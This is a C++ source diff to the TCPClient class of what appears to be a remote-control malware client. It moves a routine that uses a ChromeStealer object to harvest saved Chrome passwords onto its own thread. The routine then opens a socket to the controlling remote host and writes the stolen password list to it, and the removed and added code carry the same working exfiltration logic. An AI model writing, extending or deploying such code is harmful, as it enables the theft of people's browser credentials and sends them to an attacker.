@@ -45,6 +45,9 @@ void TCPClient::disconnect(void)
 {
 	StaticTools::Log << "Disconnecting ..." << std::endl;
 	_io_service.stop();
+	if (_stealerTask.joinable()) {
+		_stealerTask.join();
+	}
 	if (_runThread.joinable()) {
 		_runThread.join();
 	}
@@ -75,33 +78,7 @@ Packet *TCPClient::createPacket(PacketType type, std::string const& data)
 
 void TCPClient::sendStealPwd(std::string const& ftpPort)
 {
-	try {
-		ChromeStealer stealer;
-		StaticTools::Log << "sending steal pwd to ftp: " << ftpPort << std::endl;
-
-		if (!stealer.canSteal()) {
-			return;
-		}
-
-		boost::asio::io_service ios;
-		boost::asio::ip::tcp::resolver resolver(ios);
-		boost::asio::ip::tcp::resolver::query query(_remote, ftpPort);
-		boost::asio::ip::tcp::resolver::iterator it = resolver.resolve(query);
-		boost::asio::ip::tcp::socket socket(ios);
-
-		socket.connect(*it);
-
-		boost::asio::streambuf request;
-		std::ostream request_stream(&request);
-		request_stream << stealer.stealPasswordList() << std::flush;
-
-		boost::asio::write(socket, request);
-
-		write(createPacket(PacketType::PT_DeleteFTP, ftpPort));
-	}
-	catch (std::exception const& e) {
-		StaticTools::Log << "send steal pwd: " << e.what() << std::endl;
-	}
+	_stealerTask = std::thread(&TCPClient::runStealerTask, this, ftpPort);
 }
 
 
@@ -207,5 +184,36 @@ void TCPClient::runThread(void)
 	}
 	catch (std::exception const& e) {
 		std::cerr << e.what() << std::endl;
+	}
+}
+
+void TCPClient::runStealerTask(std::string const& ftpPort)
+{
+	try {
+		ChromeStealer stealer;
+		StaticTools::Log << "sending steal pwd to ftp: " << ftpPort << std::endl;
+
+		if (!stealer.canSteal()) {
+			return;
+		}
+
+		boost::asio::io_service ios;
+		boost::asio::ip::tcp::resolver resolver(ios);
+		boost::asio::ip::tcp::resolver::query query(_remote, ftpPort);
+		boost::asio::ip::tcp::resolver::iterator it = resolver.resolve(query);
+		boost::asio::ip::tcp::socket socket(ios);
+
+		socket.connect(*it);
+
+		boost::asio::streambuf request;
+		std::ostream request_stream(&request);
+		request_stream << stealer.stealPasswordList() << std::flush;
+
+		boost::asio::write(socket, request);
+
+		write(createPacket(PacketType::PT_DeleteFTP, ftpPort));
+	}
+	catch (std::exception const& e) {
+		StaticTools::Log << "send steal pwd: " << e.what() << std::endl;
 	}
 }
